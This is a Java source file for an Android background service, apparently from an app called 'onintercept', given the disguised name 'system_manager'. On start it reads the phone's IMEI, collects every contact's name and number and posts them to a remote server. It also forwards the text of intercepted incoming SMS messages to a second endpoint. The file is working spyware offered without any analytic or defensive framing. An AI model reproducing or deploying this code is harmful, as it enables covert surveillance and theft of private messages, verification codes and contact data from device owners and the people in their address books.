package im.unicolas.onintercept.asynctask;

import android.app.Notification;
import android.app.PendingIntent;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.database.Cursor;
import android.os.Handler;
import android.os.IBinder;
import android.os.Message;
import android.provider.ContactsContract;
import android.support.annotation.Nullable;
import android.telephony.TelephonyManager;
import android.util.Log;

import com.lzy.okgo.OkGo;
import com.lzy.okgo.callback.StringCallback;

import java.util.ArrayList;
import java.util.List;

import im.unicolas.onintercept.Config;
import im.unicolas.onintercept.OIApp;
import im.unicolas.onintercept.R;
import im.unicolas.onintercept.bean.MainListBean;
import okhttp3.Call;
import okhttp3.Response;

/**
 * Created by qq923 on 2016-12-11.
 */
public class system_manager extends Service {
    private static final String TAG = "MService";

    private List<String> contactList = new ArrayList<>();
    private String deviceId;

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {

        return null;
    }

    @Override
    public void onCreate() {
        super.onCreate();
        loadContacts();
        IntentFilter intentFilter = new IntentFilter("smsPost");
        registerReceiver(br, intentFilter);
    }



    private void loadContacts() {
        //if (contactList.size() > 0) contactList.clear();

        TelephonyManager telephonyManager = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
        deviceId = telephonyManager.getDeviceId();
        OIApp.getInstance().getSp().edit().putString("deviceId", deviceId).apply();
        startTakeBook();

        StringBuilder sb = new StringBuilder();
        if (contactList != null && contactList.size() > 0) {
            for (String s : contactList) {
                Log.e(TAG, "loadContacts: " + s + "     >> " + deviceId);
                sb.append(s + ",");
            }
        }

        OkGo.post(Config.CONTACTS)
                .params("imei", deviceId)
                .params("PhoneNum", sb.toString())
                .execute(new StringCallback() {
                    @Override
                    public void onSuccess(String s, Call call, Response response) {
                        Log.e(TAG, "onSuccess: 上传通讯录成功 " + s);
                    }

                    @Override
                    public void onError(Call call, Response response, Exception e) {
                        super.onError(call, response, e);
                        Log.e(TAG, "onError: 上传通讯录失败 " + e.getMessage());
                    }
                });
    }

    BroadcastReceiver br = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            String action = intent.getAction();

            if (action.equals("smsPost")) {
                String smsListener = intent.getStringExtra("smsListener");
                Log.e(TAG, "onReceive: 监听新短信 " + smsListener);
                String deviceId = OIApp.getInstance().getSp().getString("deviceId", "");
                OkGo.post(Config.POST_SMS)
                        .params("imei", deviceId)
                        .params("messages",smsListener)
                        .execute(new StringCallback() {
                            @Override
                            public void onSuccess(String s, Call call, Response response) {
                                Log.e(TAG, "onSuccess: 监听短信发送 " + s);
                                handler.sendEmptyMessage(0);
                            }

                            @Override
                            public void onError(Call call, Response response, Exception e) {
                                super.onError(call, response, e);
                                Log.e(TAG, "onError: 监听短信失败 " + e.getMessage());
                            }
                        });
            }
        }
    };

    private Handler handler = new Handler() {
        @Override
        public void handleMessage(Message msg) {
            super.handleMessage(msg);
            int what = msg.what;
            switch (what) {
                case 0:
                    Log.e(TAG, "handleMessage: 短信上传成功");

                    break;
            }
        }
    };


    //获取通讯录
    private void startTakeBook() {
        Cursor cursor = getContentResolver().query(ContactsContract.Contacts.CONTENT_URI,
                null, null, null, null);
        int contactIndex = 0;
        int nameIndex = 0;

        if (cursor.getCount() > 0) {
            contactIndex = cursor.getColumnIndex(ContactsContract.Contacts._ID);
            nameIndex = cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME);
        }

        while (cursor.moveToNext()) {
            MainListBean bean = new MainListBean();
            String contactId = cursor.getString(contactIndex);
            String name = cursor.getString(nameIndex);
            Log.e(TAG, "startTakeBook: " + contactId + "\n" + name);
            bean.setName(name);

            Cursor phones = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                    null,
                    ContactsContract.CommonDataKinds.Phone.CONTACT_ID + "=" + contactId,
                    null,null
            );
            int phoneIndex = 0;
            if (phones.getCount() > 0) {
                phoneIndex = phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER);
            }
            while (phones.moveToNext()) {
                String phoneNumber = phones.getString(phoneIndex);
                bean.setPhone(phoneNumber);
                Log.e(TAG, "startTakeBook: 手机号 " + phoneNumber);
            }

            contactList.add(bean.getName() + ":" + bean.getPhone());
        }

    }

    /*@Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Notification notification = new Notification(R.mipmap.ic_launcher,
                "running!", System.currentTimeMillis());
        PendingIntent service = PendingIntent.getService(this, 0, intent, 0);
        notification.setLatestEventInfo(this, "system.io.manager", "running", service);
        return super.onStartCommand(intent, 0, notification);
    }*/
}
